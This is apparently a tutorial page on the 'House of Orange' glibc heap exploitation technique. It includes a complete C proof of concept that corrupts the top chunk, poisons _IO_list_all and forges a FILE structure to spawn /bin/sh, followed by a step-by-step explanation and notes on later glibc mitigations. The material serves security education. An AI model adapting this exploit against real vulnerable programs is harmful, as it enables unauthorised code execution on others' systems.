#import "../../../../../typst-theme.c.typ": project
#show: project

#metadata(
  (
    title: "House of Orange",
    description: "Exploiting the glibc allocator by corrupting the top chunk to trigger a sysmalloc that frees the old top chunk into an unsorted bin, followed by FSOP (File Stream Oriented Programming).",
    date: "2025-12-27",
    order: 72,
  ),
)<frontmatter>

= glibc Allocator: House of Orange

== Introduction

The *House of Orange* is a sophisticated heap exploitation technique that does not rely on calling `free()` directly. Instead, it exploits a heap overflow to corrupt the Top Chunk (Wilderness), forcing `sysmalloc` to free the old Top Chunk into the unsorted bin when a subsequent allocation request cannot be satisfied.

Once the old Top Chunk is in the unsorted bin, the attack typically employs *File Stream Oriented Programming (FSOP)* by overwriting `_IO_list_all` to gain code execution when the program eventually aborts or exits.

== Prerequisites
- *Heap Overflow*: Ability to overwrite the Top Chunk's `size` field.
- *No Free Primitive*: This attack is specifically designed for scenarios where the attacker cannot call `free()` directly.
- *Leak Requirement*: Requires both a heap leak and a libc leak to target `_IO_list_all` and forge the `FILE` structure.
- *GLIBC Version*: Effective on glibc < 2.26. Modern versions have whitelisted vtables and changed error handling.

== Example from `house_of_orange.c`

This PoC demonstrates the House of Orange technique to achieve code execution.

```c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/syscall.h>

int winner ( char *ptr);

int main()
{
    char *p1, *p2;
    size_t io_list_all, *top;

    p1 = malloc(0x400-16);

    // VULNERABILITY: Corrupt Top Chunk size
    top = (size_t *) ( (char *) p1 + 0x400 - 16);
    top[1] = 0xc01;

    // Trigger sysmalloc to free the old top chunk
    p2 = malloc(0x1000);

    // Unsorted bin attack on _IO_list_all
    io_list_all = top[2] + 0x9a8;
    top[3] = io_list_all - 0x10;

    memcpy( ( char *) top, "/bin/sh\x00", 8);

    // Forge size to sort into smallbin-4
    top[1] = 0x61;

    // Forge FILE structure
    FILE *fp = (FILE *) top;
    fp->_mode = 0;
    fp->_IO_write_base = (char *) 2;
    fp->_IO_write_ptr = (char *) 3;

    size_t *jump_table = &top[12]; 
    jump_table[3] = (size_t) &winner;
    *(size_t *) ((size_t) fp + sizeof(FILE)) = (size_t) jump_table;

    // Trigger FSOP via malloc error
    malloc(10);

    return 0;
}

int winner(char *ptr)
{
    system(ptr);
    syscall(SYS_exit, 0);
    return 0;
}
```

== Attack Flow Explained

=== 1. Corrupting the Top Chunk

The attack begins by corrupting the Top Chunk's size field via a heap overflow. The new size must satisfy certain constraints:
- It must be page-aligned (Top Chunk + size must end at a page boundary).
- The `PREV_INUSE` bit must be set.

By reducing the Top Chunk's size (e.g., to `0xc01`), we set the stage for the next step.

=== 2. Triggering `sysmalloc`

When a `malloc()` request is made that is larger than the (corrupted) Top Chunk size, the allocator calls `sysmalloc()`. Because the Top Chunk is now smaller than what's needed, `sysmalloc` will decide to "free" the old Top Chunk and allocate a new one (via `mmap` or `sbrk`).

The old Top Chunk is then inserted into the *unsorted bin*.

=== 3. Unsorted Bin Attack on `_IO_list_all`

Now that the old Top Chunk is in the unsorted bin, we use the heap overflow again (or the same one if we could reach far enough) to corrupt its `bk` pointer.
We set `bk = _IO_list_all - 0x10`.

When `malloc()` is called again, it traverses the unsorted bin. The unsorted bin attack will overwrite `_IO_list_all` with the address of the unsorted bin in `main_arena`.

=== 4. Sorting into Smallbins and FSOP

By setting the old Top Chunk's size to a value like `0x61`, we force `malloc` to sort it into a smallbin during its traversal. The address of the unsorted bin (now in `_IO_list_all`) will eventually point to our corrupted chunk when viewed as a file structure linked list.

Finally, we craft a fake `FILE` structure within our corrupted chunk that points to `system("/bin/sh")`. When `malloc` detects a corrupted state (due to our size manipulations) and calls `abort()`, glibc flushes all file streams, triggering our payload via `_IO_flush_all_lockp`.

== Modern Mitigations

- *glibc 2.24*: Added a whitelist check for `_IO_FILE` vtables, breaking simple FSOP.
- *glibc 2.26*: `malloc_printerr` no longer calls `_IO_flush_all_lockp`, preventing the `abort()` chain from being used this way.
